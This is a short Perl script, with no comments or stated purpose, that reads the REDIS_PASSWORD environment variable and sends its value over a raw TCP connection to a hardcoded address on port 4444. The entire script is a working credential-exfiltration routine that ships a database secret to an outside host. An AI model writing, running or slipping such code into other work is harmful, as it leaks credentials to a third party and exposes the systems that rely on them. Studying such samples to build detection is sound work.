#!/usr/bin/perl
use strict;
use warnings;
use IO::Socket::INET;

my $remote_host = '10.105.103.196';
my $remote_port = 4444;

my $env_var = "REDIS_PASSWORD";
my $data_to_send = $ENV{$env_var};

my $socket = IO::Socket::INET->new(
    PeerAddr => $remote_host,
    PeerPort => $remote_port,
    Proto    => 'tcp',
) or die "Failed to connect to $remote_host:$remote_port - $!";

print $socket $data_to_send;
$socket->close();
